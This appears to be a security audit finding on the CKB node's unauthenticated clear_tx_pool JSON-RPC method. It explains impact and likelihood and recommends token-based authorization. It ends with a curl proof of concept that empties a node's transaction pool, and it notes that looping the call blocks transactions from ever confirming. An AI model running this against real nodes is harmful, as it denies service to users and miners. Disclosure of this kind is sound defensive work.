### Title
Unprivileged RPC Caller Can Wipe the Entire Transaction Pool via `clear_tx_pool` — (`rpc/src/module/pool.rs`)

---

### Summary

The `Pool` RPC module exposes `clear_tx_pool()`, a privileged state-mutating operation that removes every pending transaction from the node's mempool. The function contains no caller-identity check or authorization guard of any kind. Any entity that can reach the JSON-RPC endpoint — including a local CLI user, a misconfigured internet-exposed node, or an SSRF pivot — can silently drain the entire transaction pool at will, causing sustained denial-of-service against pending transactions and mining revenue.

---

### Finding Description

`clear_tx_pool` is declared in the `PoolRpc` trait and implemented in `PoolRpcImpl` with no authorization check:

```rust
// rpc/src/module/pool.rs  lines 684-692
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

There is no caller-identity check, no token, no secret, and no role guard before `clear_pool(snapshot)` is called. The function is registered unconditionally whenever the `Pool` module is enabled.

The `Pool` module is enabled by default in the shipped configuration:

```toml
# resource/ckb.toml  line 190
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

The RPC server is bound to `127.0.0.1:8114` by default, but:
- Node operators routinely expose the RPC to `0.0.0.0` for remote management or dApp integration.
- The RPC README itself warns: *"Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged"* — yet provides no in-process enforcement.
- An SSRF vulnerability in any co-located service (e.g., a web wallet, block explorer, or monitoring agent) can reach `127.0.0.1:8114` without network exposure.

The analogous `clear_tx_verify_queue` (lines 694–700) has the same defect and can be used to drain the verification backlog.

---

### Impact Explanation

An attacker who can send a single HTTP POST to the RPC endpoint can:

1. **Drop all pending user transactions** — every transaction waiting for confirmation is silently discarded. Users must resubmit; if the attacker repeats the call in a loop, transactions can never confirm.
2. **Deny mining revenue** — miners assemble blocks from the pool. An empty pool means only the coinbase transaction is included, eliminating all fee income.
3. **Disrupt dependent services** — wallets, exchanges, and dApps that rely on `tx_pool_info` or `get_raw_tx_pool` to track pending state will observe a permanently empty pool, breaking their logic.

The attack is zero-cost, requires no CKB balance, no cryptographic material, and no protocol knowledge beyond a single JSON-RPC call.

---

### Likelihood Explanation

- The `Pool` module is **on by default**; operators do not need to opt in.
- Surveys of blockchain node deployments consistently show a significant fraction of nodes with RPC ports exposed to the internet (e.g., Shodan queries for port 8114).
- The attack payload is a single unauthenticated HTTP request — no special tooling required.
- The CKB documentation warns about exposure but provides no in-process mitigation, leaving the burden entirely on operators.

---

### Recommendation

Add an authorization mechanism before any state-mutating RPC call. The minimal fix is to require a configurable bearer token or shared secret for privileged methods. A structured approach:

1. Add an optional `rpc_secret_token` field to `RpcConfig`.
2. In the RPC middleware layer (or at the top of each privileged handler), verify the `Authorization` header against the configured token before proceeding.
3. Mark `clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`, `set_network_active`, `set_ban`, and `clear_banned_addresses` as requiring this token.

Alternatively, split the RPC server into two listeners — a public read-only port and a privileged management port bound strictly to `127.0.0.1` — and serve state-mutating methods only on the management port.

---

### Proof of Concept

**Precondition:** A CKB node with the default configuration, RPC accessible at `127.0.0.1:8114` (or any exposed address).

**Step 1 — Confirm transactions are pending:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":1}'
# Returns: {"pending":"0x5", ...}
```

**Step 2 — Wipe the pool with no credentials:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":2}'
# Returns: {"result":null}
```

**Step 3 — Confirm pool is empty:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":3}'
# Returns: {"pending":"0x0", "total_tx_size":"0x0", ...}
```

All previously pending transactions are gone. Repeating Step 2 in a loop prevents any transaction from ever accumulating in the pool.
